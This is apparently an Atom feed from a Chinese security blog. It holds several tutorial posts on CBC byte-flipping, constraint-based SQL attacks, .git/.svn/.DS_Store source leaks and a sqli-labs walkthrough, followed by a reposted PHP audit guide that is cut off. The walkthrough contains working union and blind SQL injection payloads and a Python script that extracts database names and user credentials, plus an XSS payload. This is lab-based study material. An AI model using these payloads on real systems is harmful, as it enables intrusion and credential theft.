<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>13m0nade&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://13m0nade.github.io/"/>
  <updated>2019-08-26T07:00:05.222Z</updated>
  <id>https://13m0nade.github.io/</id>
  
  <author>
    <name>13m0nade</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CBC字节翻转攻击和基于约束的SQL攻击</title>
    <link href="https://13m0nade.github.io/2019/08/26/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E5%92%8C%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E7%9A%84SQL%E6%94%BB%E5%87%BB/"/>
    <id>https://13m0nade.github.io/2019/08/26/CBC字节翻转攻击和基于约束的SQL攻击/</id>
    <published>2019-08-26T06:52:35.000Z</published>
    <updated>2019-08-26T07:00:05.222Z</updated>
    
    <content type="html"><![CDATA[<p>最近划水严重，反正水了一水到底，再水一篇文章，记录划水的学习。</p><h1>CBC字节翻转攻击</h1><p>此攻击方法的精髓在于：<strong>通过损坏密文字节来改变明文字节</strong>。借由CBC可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。</p><p><strong>CBC原理</strong>：对于密码学有了解的对于CBC应该不陌生，在这里就不多讲了，需要注意的是明文、密文、IV。<strong>Ciphertext-N-1（密文-N-1）是用来产生下一块明文</strong>；这就是字节翻转攻击开始发挥作用的地方。如果我们改变<em>Ciphertext-N-1</em>（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了。</p><p>假设我们输入用户名为admim密码为123，在序列化后得到明文a:2:{s:8:“username”;s:5:“admim”;s:8:“password”;s:3:“123”;}    把明文分为16个字节的块，这里我们需要将m改为n即可登录。m在第二组第13位，所以只需改变第一组13位即可。</p><p><strong>脚本</strong>：</p><ol><li><code>$v = &quot;a:2:{s:8:&quot;username&quot;;s:5:&quot;admim&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;}&quot;;</code></li><li><code>$enc = @encrypt($v);</code></li><li><code>$enc[13] = chr(ord($enc[13]) ^ ord(&quot;m&quot;) ^ ord (&quot;n&quot;));</code></li><li><code>$b = @decrypt($enc);</code></li></ol><p>运行结果admim变为admin</p><p><strong>解释</strong>：</p><p>第二块明文偏移量为13的字符© = 第一块密文偏移量为13的字符(A) ^ decrypt(第二块密文的偏移量为13的字符)(B)</p><p>即 C = A ^ B，这里我们知道C和A，因此B = A ^ C</p><p>假设我们修改A为A2，A2 = A ^ C ^ D（我们想要的字符，这里指n）</p><p>那么C = A2 ^ B = A ^ C ^ D ^ A ^ C = 0 ^ D  = D，即</p><p>$enc[13] = chr(ord($enc[13]) ^ ord(“m”) ^ ord (“n”))</p><p><strong>最后因为改了第一组所以还要改一下初始向量IV，也使用异或，new_iv = decrypt(第一块原密文) ^ 第一块正确明文 =  第一块错误明文 ^ ord_iv ^ 第一块正确明文</strong></p><p><strong>参考链接</strong>：<a href="https://www.freebuf.com/articles/system/163756.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/163756.html</a></p><p><a href="http://www.anquan.us/static/drops/tips-7828.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-7828.html</a></p><h1>基于约束的SQL攻击</h1><p><strong>注意不是SQL注入攻击</strong></p><p>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire          ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。</p><p>SELECT * FROM users WHERE username='vampire     ';</p><p>但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在<a href="https://support.microsoft.com/en-in/kb/316626" target="_blank" rel="noopener">内部</a>使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</p><p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近划水严重，反正水了一水到底，再水一篇文章，记录划水的学习。&lt;/p&gt;
&lt;h1&gt;CBC字节翻转攻击&lt;/h1&gt;
&lt;p&gt;此攻击方法的精髓在于：&lt;strong&gt;通过损坏密文字节来改变明文字节&lt;/strong&gt;。借由CBC可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用
      
    
    </summary>
    
      <category term="划水日常" scheme="https://13m0nade.github.io/categories/%E5%88%92%E6%B0%B4%E6%97%A5%E5%B8%B8/"/>
    
    
      <category term="划水日常" scheme="https://13m0nade.github.io/tags/%E5%88%92%E6%B0%B4%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>常见web源码泄露</title>
    <link href="https://13m0nade.github.io/2019/08/15/%E5%B8%B8%E8%A7%81web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <id>https://13m0nade.github.io/2019/08/15/常见web源码泄露/</id>
    <published>2019-08-15T07:33:10.000Z</published>
    <updated>2019-08-15T07:35:25.105Z</updated>
    
    <content type="html"><![CDATA[<p>最近刷题遇到了一道git源码泄露的题目，查阅资料发现还有许多的源码泄露，写下此文记录一下常见的源码泄漏问题。</p><h1>.git源码泄露</h1><p><strong>成因</strong>：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><p><strong>工具</strong>：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">githack</a>      <a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><p><strong>方法</strong>：</p><ol><li><a href="http://GitHack.py" target="_blank" rel="noopener">GitHack.py</a> <a href="http://www.example.com/.git/" target="_blank" rel="noopener">http://www.example.com/.git/</a></li><li><a href="http://rip-git.pl" target="_blank" rel="noopener">rip-git.pl</a> -v -u <a href="http://www.example.com/.git/" target="_blank" rel="noopener">http://www.example.com/.git/</a>  （如果想忽略SSL认证验证使用-s）</li><li>爬虫爬取整个git目录 (这个方法比较原始 , 需要具有一定的Git经验 , 这里重点介绍这种方法 , 但是这种方法和使用githack这个工具相比 , 有一个比较好的地方就是 , 可以完全模拟服务器上的代码环境 , 可以跟踪到git的每一次提交 , 但是githack好像只可以将源码恢复到最近的一次提交 , 这里的好处还有可以去查看git的提交日志 , 这个日志信息中会有开发人员对每一次commit的描述 , 比如某个BUG的修复等等 , 对于这些和BUG相关的地方 , 可以有针对性地进行白盒审计 , 有可能这个BUG修复了还不如没修复 , 可能会造成更大的漏洞)</li></ol><h1>svn 源码泄露</h1><p><strong>成因</strong>：SVN（subversion）是源代码版本管理软件。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。</p><p><strong>工具</strong>：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a>    seay-SVN  （<a href="http://pan.baidu.com/s/1mrNpB" target="_blank" rel="noopener">下载链接</a>）</p><p><strong>用法</strong>：<a href="http://rip-svn.pl" target="_blank" rel="noopener">rip-svn.pl</a> -v -u <a href="http://www.example.com/.svn/" target="_blank" rel="noopener">http://www.example.com/.svn/</a></p><h1>网站源码压缩备份泄露</h1><p><strong>成因</strong>：一般网站管理员在日常维护中，总会把网站源码给备份一下，防止网站出现问题时，能马上的恢复使用，不过一般的管理员安全意识不高，在备份的时候，会使用一些常见的压缩备份名，而且不光使用常见的备份名字，大部分的管理还会把备份好的源码直接放在网站根目录里，这样给一些不法之徒，提供了一个很方便的渗透思路，或者有些直接不需要渗透了，因为备份中的数据，就已经满足那些不法之徒的需求了。</p><p><strong>工具</strong>：这个其实不是靠工具的，是靠字典的，工具的话，网上任何能扫目录的工具，都可以用来探测源码备份的，不过常见的还是用的 御剑1.5 ，或者自己写的一些扫目录的小脚本工具。</p><h1>.DS_Store文件泄漏</h1><p><strong>成因</strong>：.DS_Store是Mac下Finder用来保存如何展示文件//文件夹的数据文件，每个文件夹下对应一个。由于开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，可能造成文件目录结构泄漏、源代码文件等敏感信息的泄露。</p><p><strong>实例</strong>：TCL某网站DS_Store文件泄露敏感信息</p><p><strong>工具</strong>：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">ds_store_exp</a></p><p><strong>方法</strong>：python ds_store_exp.py <a href="http://www.example.com/.DS_Store" target="_blank" rel="noopener">http://www.example.com/.DS_Store</a></p><h1>.hg源码泄露</h1><p><strong>成因</strong>：hg init的时候会生成.hg（网上资料较少）</p><p><strong>工具</strong>：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><p><strong>用法</strong>：<a href="http://rip-hg.pl" target="_blank" rel="noopener">rip-hg.pl</a> -v -u <a href="http://www.example.com/.hg/" target="_blank" rel="noopener">http://www.example.com/.hg/</a>  （如果想忽略SSL认证验证使用-s）</p><p><strong>--------------------------------------我不是分割线-------------------------------------</strong></p><p><strong>总结</strong>：源码泄露还有好几个，例如cvs泄露，bzr等，但是在实际的漏洞挖掘中，这些不常见，或者说就前三种，剩下的源码泄露的漏洞都是不好找。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近刷题遇到了一道git源码泄露的题目，查阅资料发现还有许多的源码泄露，写下此文记录一下常见的源码泄漏问题。&lt;/p&gt;
&lt;h1&gt;.git源码泄露&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;成因&lt;/strong&gt;：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git
      
    
    </summary>
    
      <category term="web安全" scheme="https://13m0nade.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="源码泄露" scheme="https://13m0nade.github.io/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>解锁SQL注入技能1</title>
    <link href="https://13m0nade.github.io/2019/08/06/%E8%A7%A3%E9%94%81SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E8%83%BD1/"/>
    <id>https://13m0nade.github.io/2019/08/06/解锁SQL注入技能1/</id>
    <published>2019-08-06T08:10:03.000Z</published>
    <updated>2019-08-06T08:28:58.922Z</updated>
    
    <content type="html"><![CDATA[<h1>解锁SQL注入技能(1)</h1><h2 id="sql注入基本流程"><a class="header-anchor" href="#sql注入基本流程">null</a>SQL注入基本流程</h2><p>1)<strong>首先测试正常数据</strong>，如?id=1</p><p>2)<strong>判断是否存在注入点</strong>，如在?id=1+【‘】、【and 1=1】或【and 1=2】</p><p>3)<strong>判断字段长度</strong>,列数如在?id=1+【‘】+【 order by 1 (数字任意)】，id=1‘ order by 1=1 # ,id=1’ order by 1=2 #</p><p>4)<strong>判断字段回显位置</strong>，如在?id=1+【‘】+【union select 1,2,3,4,5,6,7,8,9,10,11#】</p><p>5)<strong>判断数据库信息</strong>：<br>利用内置函数暴数据库信息<br>version()版本；database()数据库；user()用户；<br>不用猜解可用字段暴数据库信息(有些网站不适用):<br>and 1=2 union all select version()<br>and 1=2 union all select database()<br>and 1=2 union all select user()<br>操作系统信息：and 1=2 union all select @@global.version_compile_os from mysql.user<br>数据库权限：<br>and ord(mid(user(),1,1))=114返回正常说明为root</p><p>6)<strong>查找数据库名</strong><br>Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息union select information_schema from information_schema.schemata （语句在显示位）</p><p>7)<strong>查找数据库表名</strong><br>union select group_concat(table_name) from information_schema.tables where table_schema=database()</p><p>8)<strong>查找列名</strong><br>union select group_concat(column_name) from information_schema.columns where table_name=‘users’ --+</p><p>9)<strong>获取值</strong><br>union select group_concat(username,password) from users–+<br>或者1’ union select 1,(select 列名 from 表名),3,4#</p><p>10)<strong>查找数据库表中所有字段以及字段值</strong><br>and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1</p><p><strong>判断是否存在注入点</strong><br>?id=100’ 返回错误说明有可能注入<br>?id=100 and 1=1 返回正常<br>?id=100 and 1=2返回错误</p><h2 id="开始cxk式操作"><a class="header-anchor" href="#开始cxk式操作">null</a>开始CXK式操作</h2><p><strong>平台：sqli-labs</strong></p><p><strong>工具：firefox，hackbar</strong></p><p><strong>LV1</strong></p><p>根据名字可知，第一关为基于报错的单引号字符型注入（后续将给出判断过程）。</p><ol><li>在url后输入?id=1页面回显正常，然后加上‘，页面出现报错“You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1&quot;，是单引号型注入，使用–+注释后页面回显正常。</li><li>使用order by判断字段长度，order by 4时出现报错，3时回显正常，所以字段长度为3.</li><li>使用?id=0’union select 1,2,group_concat(schema_name) from information_schema.schemata --+来查找数据库名（id要为不存在的字段，好让第一句结果为空，直接显示第二句的结果）</li><li>使用?id=0’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= ‘security’–+查询数据库表名</li><li>id=0’union select 1,2,group_concat(column_name) from information_schema.columns where table_name= ‘users’–+查询数据库列名</li><li>使用?id=0’ union select 1 , group_concat(username) ,group_concat(password)from security.users–+爆出username和password</li></ol><p><strong>LV2</strong></p><ol><li>在url后输入?id=1页面回显正常，然后加上‘，页面出现报错“You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right<br>syntax to use near ‘’ LIMIT 0,1’ at line 1”可以得到这个sql语句其实并没有单引号，只是用数字进行查询。（或者输入?id=2-1，结果与?id=1相同）</li><li>继续第一关操作，单引号去掉，也不用注释，其它保持不变就行。payload：id=0 union select 1 , group_concat(username) ,group_concat(password)from security.users</li></ol><p><strong>LV3</strong></p><ol><li>在url后输入?id=1页面回显正常，然后加上‘，页面出现报错“You have an error in your SQL syntax check the manual that corresponds to your MariaDB  server version for the right syntax to use near ‘‘1’’) LIMIT 0,1’ at line 1”，加上)–+后显示正常。</li><li>继续1的操作，只要在引号后加上）即可。   ?id=0’) union select 1 , group_concat(username) ,group_concat(password)from security.users–+</li></ol><p><strong>LV4</strong></p><p>在url后输入?id=1页面回显正常，然后加上‘，页面未报错，输入”页面出现报错“You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘“1&quot;”) LIMIT 0,1’ at line 1“，加上)–+后显示正常。</p><p>继续1的操作，只要在双引号后加上）即可。  ?id=0&quot;) union select 1 , group_concat(username) ,group_concat(password)from security.users–+</p><p><strong>LV5</strong></p><ol><li>输入?id=1显示显示You are in…,输入‘出现报错“You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for theright syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1 ”，注释后显示You are in…。</li><li>尝试之前的注入方法，会发现不再会返回我们注入的信息，如果注入成功的话，页面会返回You are in…，出错的话就不会返回这个字符串，所以这里我们可以进行盲注。</li><li><strong>?id=1’</strong>  <strong>and left(version(),1)=5 %23</strong>    查看版本信息</li><li><strong>?id=1’ and length(database())= 8 %23</strong>    判断数据库长度</li><li>猜测数据库名称（从第一位开始猜）：<br>1&gt;猜第1位<br>?id=1’ and left(database(),1)&gt;‘a’ %23<br>返回正常<br>?id=1’ and left(database(),1)&gt;‘z’ %23<br>返回错误<br>说明第一位在a和z之间<br>?id=1’ and left(database(),1)&gt;‘s’ %23<br>返回正确<br>所以第一位是s<br>1&gt;猜第2位<br>?id=1’ and left(database(),2)&gt;‘sa’ %23<br>返回正常<br>?id=1’ and left(database(),2)&gt;‘sz’ %23<br>返回错误<br>说明第二位在a和z之间<br>?id=1’ and left(database(),2)&gt;‘se’ %23<br>返回正确<br>所以第二位是e<br>以此类推，直到推出第8位：最后数据库为security</li><li>猜测数据库（security）中的表：<br>?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit a,1)b,1))&gt;n<br>说明：<br>a是从0开始第几个表，b是为第几个字符，n是ASCII所对应的十进制数</li><li>猜用户：<br>?id=1’and ord(mid((select ifnull(cast(username as char),0x20)from S. M order by  id  limit A,1),B,1))=N %23<br>其中S 为数据库名；M为表名；A为第几个用户；B为第几个字符；N为ASCII码所对应的十进制数。</li><li>猜用户和密码：<br>?id=1’  and ord(mid((select ifnull(cast(username as char),0x20)from S.Morder by id limit A,1),B,1))=N %23<br>其中S 为数据库名；M为表名；A为第几个用户；B为第几个字符；N为ASCII码所对应的十进制数。<br>例：?id=1’  and ord(mid((select ifnull(cast(password as char),0x20)from security.users order by id limit 0,1),1,1))=68 %23</li></ol><p>可直接使用python脚本，具体代码如下（python3）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsurl = <span class="string">'http://127.0.0.1/sqlilabs/Less-5/?id=1'</span>db_length = <span class="number">0</span>db_name = <span class="string">''</span>table_num = <span class="number">0</span>table_len = <span class="number">0</span>table_name = <span class="string">''</span>table_list = []column_num = <span class="number">0</span>column_len = <span class="number">0</span>column_name = <span class="string">''</span>column_list = []dump_num = <span class="number">0</span>dump_len = <span class="number">0</span>dump_name = <span class="string">''</span>dump_list = []i = j = k = <span class="number">0</span><span class="comment">### 当前数据库名长度 ###for i in range(1,20):    db_payload = '''' and (length(database())=%d)--+''' %i    # print(url+db_payload)    r = requests.get(url+db_payload)    if "You are in" in r.text:        db_length = i        print('当前数据库名长度为：%d' % db_length)        break### 当前数据库名 ###print('开始猜解数据库名......')for i in range(1,db_length+1):    for j in range(95,123):        db_payload = '''' and (left(database(),%d)='%s')--+''' % (i,db_name+chr(j))        r = requests.get(url+db_payload)        if "You are in" in r.text:            db_name += chr(j)            # print(db_name)            breakprint('数据库名：\n[+]',db_name)### 当前数据库表的数目 ###for i in range(100):    db_payload = '''' and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+''' % (i,db_name)    r = requests.get(url+db_payload)    # print(url+db_payload)    if "You are in" in r.text:        table_num = i        breakprint('一共有%d张表' % table_num)print('开始猜解表名......')### 每张表的表名长度及表名 ###for i in range(table_num):    table_len = 0    table_name = ''    #### 表名长度 ####    for j in range(1,21):        db_payload = '''' and ascii(substr((select table_name from information_schema.tables where table_schema="security" limit %d,1),%d,1))--+''' % (i,j)        r = requests.get(url+db_payload)        # print(db_payload)        if "You are in" not in r.text:            table_len = j-1            #### 猜解表名 ####            for k in range(1,table_len+1):                for l in range(95,123):                    db_payload = '''' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d--+''' % (i,k,l)                    # print(db_payload)                    r = requests.get(url+db_payload)                    # print(db_payload)                    if "You are in" in r.text:                        table_name += chr(l)            print(table_name)            table_list.append(table_name)            breakprint('表名：',table_list)### 每个表的列的数目、列名及列名长度 ###for i in table_list:    #### 每个表的列的数目 ####    for j in range(100):        db_payload = '''' and %d=(select count(column_name) from information_schema.columns where table_name='%s')--+''' % (        j, i)        r = requests.get(url + db_payload)        if "You are in" in r.text:            column_num = j            print(("[+] 表名：%-10s\t" % i) + str(column_num) + '字段')            break#### 猜解列名长度 ####column_num = 3print('%s表中的列名：' % table_list[-1])for j in range(3):    column_name = ''    for k in range(1,21):        db_payload = '''' and ascii(substr((select column_name from information_schema.columns where table_name="%s" limit %d,1),%d,1))--+''' % (table_list[-1],j,k)        r = requests.get(url+db_payload)        if "You are in" not in r.text:            column_len = k-1            # print(column_len)            break        #### 猜解列名 ####        for l in range(95,123):            db_payload = '''' and ascii(substr((select column_name from information_schema.columns where table_name="%s" limit %d,1),%d,1))=%d--+''' % (table_list[-1],j,k,l)            r = requests.get(url + db_payload)            if "You are in" in r.text:                column_name += chr(l)    print('[+] ',column_name)    column_list.append(column_name)print('开始爆破以下字段：',column_list[1:])for column in column_list[1:]:    print(column,'：')    dump_num = 0    for i in range(30):        db_payload = '''' and %d=(select count(%s) from %s.%s)--+''' % (i,column,db_name,table_list[-1])        # print(db_payload)        r = requests.get(url+db_payload)        if "You are in" in r.text:            dump_num = i            # print(i)            break    for i in range(dump_num):        dump_len = 0        dump_name = ''        #### 字段长度 ####        for j in range(1, 21):            db_payload = '''' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+''' % (column,db_name,table_list[-1],i,j)            r = requests.get(url + db_payload)            if "You are in" not in r.text:                dump_len = j-1                for k in range(1, dump_len + 1):                    for l in range(1,256):                        db_payload = '''' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+''' % (column,db_name,table_list[-1],i,k,l)                        # print(db_payload)                        r = requests.get(url+db_payload)                        if "You are in" in r.text:                            dump_name += chr(l)                            # print(dump_name)                            break                break        print('[+]',dump_name)</span></span><br></pre></td></tr></table></figure><p>因篇幅过长下次更新。。。</p><p>敬请关注：-）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;解锁SQL注入技能(1)&lt;/h1&gt;
&lt;h2 id=&quot;sql注入基本流程&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#sql注入基本流程&quot;&gt;null&lt;/a&gt;SQL注入基本流程&lt;/h2&gt;
&lt;p&gt;1)&lt;strong&gt;首先测试正常数据&lt;/strong&gt;，如?
      
    
    </summary>
    
      <category term="web安全" scheme="https://13m0nade.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sql注入" scheme="https://13m0nade.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>高级PHP应用程序漏洞审核技术</title>
    <link href="https://13m0nade.github.io/2019/07/30/%E9%AB%98%E7%BA%A7PHP%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%AE%A1%E6%A0%B8%E6%8A%80%E6%9C%AF/"/>
    <id>https://13m0nade.github.io/2019/07/30/高级PHP应用程序漏洞审核技术/</id>
    <published>2019-07-30T06:59:22.000Z</published>
    <updated>2019-07-30T07:09:59.306Z</updated>
    
    <content type="html"><![CDATA[<h1>高级PHP应用程序漏洞审核技术（转载）</h1><ul><li>前言</li><li>传统的代码审计技术</li><li>PHP版本与应用代码审计</li><li>其他的因素与应用代码审计</li><li>扩展我们的字典<ul><li>变量本身的key</li><li>变量覆盖<ul><li>遍历初始化变量</li><li>parse_str()变量覆盖漏洞</li><li>import_request_variables()变量覆盖漏洞</li><li>PHP5 Globals</li></ul></li><li>magic_quotes_gpc与代码安全<ul><li>什么是magic_quotes_gpc</li><li>哪些地方没有魔术引号的保护</li><li>变量的编码与解码</li><li>二次攻击</li><li>魔术引号带来的新的安全问题</li><li>变量key与魔术引号</li></ul></li><li>代码注射<ul><li>PHP中可能导致代码注射的函数</li><li>变量函数与双引号</li></ul></li><li>PHP自身函数漏洞及缺陷<ul><li>PHP函数的溢出漏洞</li><li>PHP函数的其他漏洞</li><li>session_destroy()删除文件漏洞</li><li>随机函数</li></ul></li><li>特殊字符<ul><li>截断<ul><li>include截断</li><li>数据截断</li><li>文件操作里的特殊字符</li></ul></li></ul></li></ul></li><li>怎么进一步寻找新的字典</li><li>DEMO</li><li>后话</li><li>附录</li></ul><h2 id="前言"><a class="header-anchor" href="#前言">null</a>前言</h2><p>PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。</p><p>另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：）</p><h2 id="传统的代码审计技术"><a class="header-anchor" href="#传统的代码审计技术">null</a>传统的代码审计技术</h2><p>WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输入”理解为只是gpc<code>[</code>$<code>_</code>GET,$<code>_</code>POST,$<code>_</code>COOKIE<code>]</code>，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。</p><p>PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。</p><p>其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用程序代码的审核，但是这些也依靠了我们上面提到的字典。</p><h2 id="php版本与应用代码审计"><a class="header-anchor" href="#php版本与应用代码审计">null</a>PHP版本与应用代码审计</h2><p>到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下：</p><table><thead><tr><th style="text-align:left">php4</th><th style="text-align:left">68%</th><th style="text-align:left">2000-2007，No security fixes after 2008/08，最终版本是php4.4.9</th></tr></thead><tbody><tr><td style="text-align:left">php5</td><td style="text-align:left">32%</td><td style="text-align:left">2004-present，Now at version 5.2.6（PHP 5.3 alpha1 released!）</td></tr><tr><td style="text-align:left">php6</td><td style="text-align:left"></td><td style="text-align:left">目前还在测试阶段，变化很多做了大量的修改，取消了很多安全选项如magic_quotes_gpc（这个不是今天讨论的范围）</td></tr></tbody></table><p>由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。</p><h2 id="其他的因素与应用代码审计"><a class="header-anchor" href="#其他的因素与应用代码审计">null</a>其他的因素与应用代码审计</h2><p>很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营win/<code>*</code>nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同的WEB SERVER有着不同的安全特点或特性，下文有些部分会涉及。</p><p>所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，PHP版本等信息。</p><h2 id="扩展我们的字典"><a class="header-anchor" href="#扩展我们的字典">null</a>扩展我们的字典</h2><p>下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。</p><h3 id="变量本身的key"><a class="header-anchor" href="#变量本身的key">null</a>变量本身的key</h3><p>说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></span><br><span class="line"><span class="comment">//print_R($_GET); </span></span><br><span class="line"> <span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> $key.<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key.php?&lt;script&gt;alert(1);&lt;/script&gt;=1&amp;bbb=2</span><br></pre></td></tr></table></figure><p>那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询呢？：）</p><table><thead><tr><th style="text-align:left"><strong>漏洞审计策略</strong></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table><h3 id="变量覆盖"><a class="header-anchor" href="#变量覆盖">null</a>变量覆盖</h3><p>很多的漏洞查找者都知道extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖，但是还有很多其他情况导致变量覆盖的如：</p><h4 id="遍历初始化变量"><a class="header-anchor" href="#遍历初始化变量">null</a>遍历初始化变量</h4><p>请看如下代码：</p><figure class="highlight php"><table><tr><td 